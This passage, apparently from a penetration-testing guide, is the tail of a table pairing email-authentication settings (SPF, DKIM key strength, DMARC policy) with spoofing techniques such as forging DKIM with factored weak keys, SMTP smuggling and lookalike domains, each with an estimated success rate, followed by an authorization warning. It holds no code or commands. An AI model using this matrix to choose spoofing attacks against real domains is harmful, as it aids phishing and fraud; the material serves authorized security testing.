| `-all` | Weak key ≤1024 | `p=reject` | Factor key + forge DKIM | **80%** |
| `-all` | Strong | `p=reject` | SMTP smuggling | **50%** |
| `-all` | Strong | `p=reject` | Header ambiguity attacks | **40%** |
| `-all` | Strong | `p=reject; aspf=r` | Relaxed alignment subdomain | **60%** |
| Fully hardened | Fully hardened | `p=reject` | Display name spoof / lookalike domain | **70%** |
::

::warning
Always obtain proper authorization before testing. Email spoofing attacks may violate computer fraud laws. Use these techniques only in authorized penetration testing engagements with explicit written scope including email security testing.
::